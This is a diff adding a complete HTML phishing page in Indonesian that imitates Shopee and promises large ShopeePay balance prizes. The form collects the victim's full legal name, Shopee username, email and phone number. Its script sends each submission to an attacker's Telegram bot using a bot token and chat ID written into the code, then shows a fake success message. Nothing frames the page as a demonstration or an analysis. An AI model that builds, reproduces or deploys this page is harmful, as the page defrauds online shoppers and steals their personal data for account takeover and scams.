@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Bonus Hadiah Saldo Shopee</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+    <style>
+        /* Warna utama Shopee: Orange */
+        .shopee-bg {
+            background-color: #EE4D2D;
+        }
+
+        .shopee-text {
+            color: #EE4D2D;
+        }
+
+        .shopee-border:focus {
+            border-color: #EE4D2D;
+            box-shadow: 0 0 0 1px #EE4D2D;
+        }
+    </style>
+</head>
+
+<body class="bg-gray-100 min-h-screen">
+
+    <header class="shopee-bg text-white shadow-md">
+        <div class="max-w-xl mx-auto py-3 px-4 flex justify-center items-center">
+            <h1 class="text-xl font-semibold">Klaim Bonus Hadiah Saldo</h1>
+        </div>
+    </header>
+
+    <div class="max-w-xl mx-auto p-4 sm:p-6">
+        <div class="bg-white rounded-lg shadow-xl p-6">
+            <div class="text-center mb-6">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Shopee_logo.svg" alt="Shopee Logo"
+                    class="mx-auto h-16 mb-2" />
+                <h2 class="text-2xl font-bold shopee-text">Selamat! Anda Berhak Klaim Hadiah!</h2>
+                <p class="text-gray-600 mt-2">Isi data diri Anda dengan lengkap dan benar untuk memproses klaim hadiah
+                    saldo Anda.</p>
+                <div class="mt-4 bg-orange-100 border-l-4 border-orange-500 text-orange-700 p-3" role="alert">
+                    <p class="font-bold">Penting:</p>
+                    <p>Pastikan semua data sesuai dengan akun Shopee Anda.</p>
+                </div>
+            </div>
+
+            <form id="claimForm">
+
+                <div class="mb-4">
+                    <label for="nama" class="block text-gray-700 text-sm font-medium mb-1">Nama Lengkap (Sesuai KTP)</label>
+                    <input type="text" id="nama" name="nama"
+                        class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none shopee-border"
+                        placeholder="Masukkan nama lengkap Anda" required>
+                </div>
+
+                <div class="mb-4">
+                    <label for="username" class="block text-gray-700 text-sm font-medium mb-1">Username Shopee</label>
+                    <input type="text" id="username" name="username"
+                        class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none shopee-border"
+                        placeholder="Contoh: ShopeeUser123" required>
+                </div>
+
+                <div class="mb-4">
+                    <label for="email" class="block text-gray-700 text-sm font-medium mb-1">Email Terdaftar di Shopee</label>
+                    <input type="email" id="email" name="email"
+                        class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none shopee-border"
+                        placeholder="Contoh: anda@gmail.com" required>
+                </div>
+
+                <div class="mb-4">
+                    <label for="nomer_shopee" class="block text-gray-700 text-sm font-medium mb-1">Nomor Handphone Terdaftar di Shopee</label>
+                    <input type="tel" id="nomer_shopee" name="nomer_shopee"
+                        class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none shopee-border"
+                        placeholder="Contoh: 081234567890" required pattern="[0-9]{8,15}"
+                        title="Nomor telepon harus berupa angka dan minimal 8 digit">
+                </div>
+
+                <div class="mb-6">
+                    <label for="hadiah" class="block text-gray-700 text-sm font-medium mb-1">Pilih Hadiah yang Ingin Anda Klaim</label>
+                    <select id="hadiah" name="hadiah"
+                        class="w-full px-4 py-2 border border-gray-300 rounded-md bg-white focus:outline-none shopee-border"
+                        required>
+                        <option value="">-- Pilih Hadiah --</option>
+                        <option value="Saldo_2JT">Bonus Saldo ShopeePay Rp 2.000.000</option>
+                        <option value="Saldo_5JT">Bonus Saldo ShopeePay Rp 5.000.000</option>
+                        <option value="Saldo_10JT">Bonus Saldo ShopeePay Rp 10.000.000</option>
+                        <option value="Hadiah_Utama_20JT">Hadiah Utama Saldo ShopeePay Rp 20.000.000</option>
+                    </select>
+                </div>
+
+                <button type="submit" id="submitBtn"
+                    class="w-full shopee-bg text-white font-bold py-3 rounded-md hover:bg-orange-700 transition duration-300">
+                    Klaim Hadiah Sekarang!
+                </button>
+            </form>
+
+            <div id="statusMessage" class="mt-4 p-4 rounded-md text-center hidden"></div>
+        </div>
+    </div>
+
+    <script>
+        // === KONFIGURASI TELEGRAM ===
+        // GANTI DENGAN BOT TOKEN DAN CHAT ID ANDA YANG SEBENARNYA!
+        const TELEGRAM_BOT_TOKEN = '7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0'; 
+        const TELEGRAM_CHAT_ID = '5923031825'; 
+
+        // === Fungsi untuk mengirim data ke Telegram ===
+        function sendToTelegram(message) {
+            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            // Encode pesan agar aman dikirim melalui URL
+            const encodedMessage = encodeURIComponent(message);
+            
+            // Menggunakan fetch dengan metode GET (lebih sederhana untuk URL Telegram)
+            fetch(`${apiUrl}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`, {
+                    method: 'GET'
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        // Log error jika status HTTP bukan 200
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Data formulir berhasil dikirim ke Telegram!');
+                    } else {
+                        console.error('Gagal mengirim ke Telegram (API Error):', data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error('Terjadi kesalahan saat mengirim ke Telegram:', error);
+                });
+        }
+        
+        document.getElementById('claimForm').addEventListener('submit', function (e) {
+            e.preventDefault(); // Mencegah submit form default
+
+            const form = e.target;
+            const statusMessage = document.getElementById('statusMessage');
+            const submitBtn = document.getElementById('submitBtn');
+
+            // Kumpulkan data formulir
+            const formData = {
+                nama: form.nama.value.trim(),
+                username: form.username.value.trim(),
+                email: form.email.value.trim(),
+                nomer_shopee: form.nomer_shopee.value.trim(),
+                hadiah: form.hadiah.options[form.hadiah.selectedIndex].text, // Ambil teks hadiah
+            };
+
+            // Nonaktifkan tombol dan tampilkan loading
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Memproses Klaim...';
+            statusMessage.classList.add('hidden');
+
+            // --- Format Pesan Telegram ---
+            const message = `
+*--- KLAIM HADIAH SHOPEE BARU ---*
+*Nama Lengkap:* ${formData.nama}
+*Username Shopee:* ${formData.username}
+*Email:* ${formData.email}
+*Nomor HP Shopee:* ${formData.nomer_shopee}
+*Hadiah Dipilih:* ${formData.hadiah}
+            `;
+            
+            // KIRIM DATA KE TELEGRAM
+            sendToTelegram(message); 
+
+            // Simulasi proses klaim 2 detik
+            setTimeout(() => {
+                // Tampilkan pesan sukses
+                statusMessage.textContent = '✅ Klaim berhasil diajukan! Harap tunggu konfirmasi lebih lanjut melalui email atau notifikasi Shopee Anda.';
+                statusMessage.classList.remove('hidden');
+                statusMessage.classList.remove('bg-red-100', 'text-red-700');
+                statusMessage.classList.add('bg-green-100', 'text-green-700');
+                
+                // Aktifkan kembali tombol (opsional)
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Klaim Hadiah Sekarang!';
+
+                // Alihkan ke halaman berikutnya setelah sukses
+                // window.location.href = "halaman_sukses.html";
+            }, 2000);
+        });
+    </script>
+</body>
+
+</html>
